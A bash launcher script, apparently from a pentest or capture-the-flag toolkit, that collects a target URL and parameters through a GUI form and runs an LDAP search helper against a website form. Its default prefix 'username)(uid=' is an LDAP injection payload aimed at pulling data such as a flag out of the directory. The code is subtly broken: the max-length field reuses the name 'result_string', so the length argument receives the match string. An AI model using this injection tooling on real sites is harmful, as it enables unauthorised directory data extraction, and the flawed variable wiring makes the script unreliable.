#!/bin/bash

: '
ldap: search on a website form for uid or other fields
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
URL_FIELD=$(form_item  "url" "url" "http://127.0.0.1:3000/")
SEARCH_PREFIX_FIELD=$(form_item  "ldap search prefix" "search_prefix" "username)(uid=")
SEARCH_PARAM_FIELD=$(form_item  "search param in request" "search_param" "search")
RESULT_RESULT_FIELD=$(form_item  "output result match string" "result_string" "username")
MAX_FLAG_LENGTH_FIELD=$(form_item  "max flag length" "number" "result_string" "33")

# Generate GUI form
generate_form "${URL_FIELD}" "${SEARCH_PREFIX_FIELD}" "${SEARCH_PARAM_FIELD}" "${RESULT_RESULT_FIELD}" "${MAX_FLAG_LENGTH_FIELD}"

URL=${form_data["url"]}
SEARCH_PREFIX=${form_data["search_prefix"]}
SEARCH_PARAM=${form_data["search_param"]}
RESULT_RESULT=${form_data["result_string"]}
MAX_FLAG_LENGTH=${form_data["result_string"]}

execute_command "${SCRIPTS_DIR}/reconnaissance/windows/ldap/.files/ldapSearch.py --url '${URL}' --prefix '${SEARCH_PREFIX}' --param '${SEARCH_PARAM}' --match '${RESULT_RESULT}' --length ${MAX_FLAG_LENGTH}"
create_new_line
